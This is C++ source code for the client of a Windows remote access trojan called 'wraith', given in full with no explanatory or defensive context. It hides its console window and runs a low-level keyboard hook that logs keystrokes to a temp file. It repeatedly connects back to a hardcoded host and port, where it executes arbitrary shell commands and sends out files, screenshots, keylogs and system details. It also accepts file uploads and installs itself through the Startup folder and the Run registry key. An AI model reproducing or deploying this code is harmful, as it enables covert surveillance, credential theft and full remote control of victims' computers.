#include <winsock2.h>
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <cstdio>
#include "protocol.h"
#include "crypto.h"
#pragma comment(lib, "ws2_32.lib")

using namespace wraith;

static std::string KEY = "wraith-4080-external";
static std::string HOST = "127.0.0.1";
static const int   PORTN = 4444;

static SOCKET gsock = INVALID_SOCKET;

bool connect_back() {
    WSADATA w; WSAStartup(MAKEWORD(2,2), &w);
    gsock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in a{}; a.sin_family = AF_INET; a.sin_port = htons(PORTN);
    a.sin_addr.s_addr = inet_addr(HOST.c_str());
    if (connect(gsock, (sockaddr*)&a, sizeof(a)) == SOCKET_ERROR) return false;
    char name[256]; DWORD n = 256; GetComputerNameA(name, &n);
    char user[256]; n = 256; GetUserNameA(user, &n);
    std::string hello = std::string(name) + "|" + user;
    std::vector<uint8_t> hd(hello.begin(), hello.end());
    auto p = pack(HELO, hd);
    auto c = crypt(p, KEY);
    send(gsock, (char*)c.data(), (int)c.size(), 0);
    return true;
}

void send_packet(uint8_t cmd, const std::vector<uint8_t>& data) {
    auto p = pack(cmd, data);
    auto c = crypt(p, KEY);
    send(gsock, (char*)c.data(), (int)c.size(), 0);
}

void recv_loop() {
    std::vector<uint8_t> buf;
    char tmp[8192];
    while (true) {
        int r = recv(gsock, tmp, sizeof(tmp), 0);
        if (r <= 0) return;
        buf.insert(buf.end(), tmp, tmp+r);
        Packet pkt; size_t consumed;
        while (unpack(buf, pkt, consumed)) {
            buf.erase(buf.begin(), buf.begin() + consumed);
            auto dec = crypt(pkt.payload, KEY);
            switch (pkt.cmd) {
                case EXEC: {
                    std::string cmd(dec.begin(), dec.end());
                    SECURITY_ATTRIBUTES sa{sizeof(sa), nullptr, TRUE};
                    HANDLE ro, wo; CreatePipe(&ro, &wo, &sa, 0);
                    STARTUPINFOA si{}; si.cb = sizeof(si); si.hStdOutput = wo;
                    si.hStdError = wo; si.dwFlags = STARTF_USESTDHANDLES;
                    PROCESS_INFORMATION pi{};
                    std::string full = "cmd.exe /c " + cmd;
                    if (CreateProcessA(nullptr, (char*)full.c_str(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
                        CloseHandle(wo);
                        char b[4096]; DWORD readn; std::string out;
                        while (ReadFile(ro, b, sizeof(b), &readn, nullptr) && readn) out.append(b, readn);
                        CloseHandle(ro); WaitForSingleObject(pi.hProcess, INFINITE);
                        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                        std::vector<uint8_t> od(out.begin(), out.end());
                        send_packet(SHELL_OUT, od);
                    }
                    break;
                }
                case DOWNLOAD: {
                    std::string path(dec.begin(), dec.end());
                    HANDLE f = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
                    if (f != INVALID_HANDLE_VALUE) {
                        char b[8192]; DWORD r2;
                        while (ReadFile(f, b, sizeof(b), &r2, nullptr) && r2) {
                            std::vector<uint8_t> d(b, b+r2);
                            send_packet(FILE_DATA, d);
                        }
                        CloseHandle(f);
                    }
                    send_packet(FILE_DONE, {});
                    break;
                }
                case UPLOAD: {
                    std::string s(dec.begin(), dec.end());
                    size_t z = s.find('\0');
                    std::string path = (z==std::string::npos) ? "upload.bin" : s.substr(0, z);
                    std::vector<uint8_t> data;
                    if (z != std::string::npos) data.assign(dec.begin()+z+1, dec.end());
                    else data = dec;
                    HANDLE f = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
                    if (f != INVALID_HANDLE_VALUE) { DWORD w; WriteFile(f, data.data(), (DWORD)data.size(), &w, nullptr); CloseHandle(f); }
                    send_packet(OK, {});
                    break;
                }
                case SCREEN: {
                    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
                    HDC hdc = GetDC(nullptr);
                    HDC mem = CreateCompatibleDC(hdc);
                    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
                    SelectObject(mem, bmp);
                    BitBlt(mem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
                    BITMAPINFO bi{}; bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
                    bi.bmiHeader.biWidth = w; bi.bmiHeader.biHeight = -h;
                    bi.bmiHeader.biPlanes = 1; bi.bmiHeader.biBitCount = 24;
                    bi.bmiHeader.biCompression = BI_RGB;
                    std::vector<uint8_t> px((size_t)w*h*3);
                    GetDIBits(mem, bmp, 0, h, px.data(), &bi, DIB_RGB_COLORS);
                    uint32_t rowSize = ((w*3+3)/4)*4;
                    uint32_t imgSize = rowSize*h;
                    uint32_t fileSize = 54 + imgSize;
                    std::vector<uint8_t> out(fileSize, 0);
                    out[0]='B'; out[1]='M';
                    memcpy(out.data()+2, &fileSize, 4);
                    uint32_t off = 54; memcpy(out.data()+10, &off, 4);
                    uint32_t dh = 40; memcpy(out.data()+14, &dh, 4);
                    memcpy(out.data()+18, &w, 4); int hh = h; memcpy(out.data()+22, &hh, 4);
                    uint16_t planes = 1; memcpy(out.data()+26, &planes, 2);
                    uint16_t bpp = 24; memcpy(out.data()+28, &bpp, 2);
                    memcpy(out.data()+34, &imgSize, 4);
                    for (int y = 0; y < h; y++) {
                        memcpy(out.data()+54 + (size_t)y*rowSize, px.data()+(size_t)y*w*3, w*3);
                    }
                    DeleteObject(bmp); DeleteDC(mem); ReleaseDC(nullptr, hdc);
                    send_packet(SCREEN, out);
                    break;
                }
                case KEYLOG: {
                    std::string p = "C:\\Windows\\Temp\\wl.log";
                    HANDLE f = CreateFileA(p.c_str(), GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
                    std::string out;
                    if (f != INVALID_HANDLE_VALUE) {
                        char b[4096]; DWORD r2;
                        while (ReadFile(f, b, sizeof(b), &r2, nullptr) && r2) out.append(b, r2);
                        CloseHandle(f);
                    }
                    std::vector<uint8_t> od(out.begin(), out.end());
                    send_packet(KEYLOG, od);
                    break;
                }
                case PERSIST: {
                    char self[MAX_PATH]; GetModuleFileNameA(nullptr, self, MAX_PATH);
                    char dst[MAX_PATH]; GetEnvironmentVariableA("APPDATA", dst, MAX_PATH);
                    std::string target = std::string(dst) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\wraith.exe";
                    CopyFileA(self, target.c_str(), FALSE);
                    HKEY k; RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &k);
                    RegSetValueExA(k, "Wraith", 0, REG_SZ, (BYTE*)target.c_str(), (DWORD)target.size()+1);
                    RegCloseKey(k);
                    send_packet(OK, {});
                    break;
                }
                case UNINSTALL: {
                    char dst[MAX_PATH]; GetEnvironmentVariableA("APPDATA", dst, MAX_PATH);
                    std::string target = std::string(dst) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\wraith.exe";
                    DeleteFileA(target.c_str());
                    HKEY k; RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &k);
                    RegDeleteValueA(k, "Wraith"); RegCloseKey(k);
                    send_packet(OK, {});
                    Sleep(500); exit(0);
                }
                case SYSINFO: {
                    char name[256]; DWORD n=256; GetComputerNameA(name,&n);
                    char user[256]; n=256; GetUserNameA(user,&n);
                    OSVERSIONINFOA ovi{}; ovi.dwOSVersionInfoSize=sizeof(ovi); GetVersionExA(&ovi);
                    char buf[512]; sprintf(buf, "host=%s user=%s os=%lu.%lu", name, user, ovi.dwMajorVersion, ovi.dwMinorVersion);
                    std::string s = buf;
                    std::vector<uint8_t> od(s.begin(), s.end());
                    send_packet(SYSINFO, od);
                    break;
                }
            }
        }
    }
}

void keylog_thread() {
    HHOOK h = SetWindowsHookEx(WH_KEYBOARD_LL, [](int n, WPARAM w, LPARAM l) -> LRESULT {
        if (n == HC_ACTION && w == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
            std::ofstream f("C:\\Windows\\Temp\\wl.log", std::ios::app);
            if (k->vkCode == VK_RETURN) f << "[ENTER]\n";
            else if (k->vkCode == VK_SPACE) f << " ";
            else if (k->vkCode == VK_BACK) f << "[BKSP]";
            else {
                BYTE st[256]; GetKeyboardState(st);
                char ch; if (ToAscii(k->vkCode, k->scanCode, st, (LPWORD)&ch, 0)==1) f << ch;
            }
        }
        return CallNextHookEx(nullptr, n, w, l);
    }, GetModuleHandle(nullptr), 0);
    MSG m; while (GetMessage(&m, nullptr, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); }
}

int main() {
    HWND h = GetConsoleWindow(); ShowWindow(h, SW_HIDE);
    std::thread t(keylog_thread); t.detach();
    while (true) {
        if (connect_back()) recv_loop();
        Sleep(10000);
    }
    return 0;
}
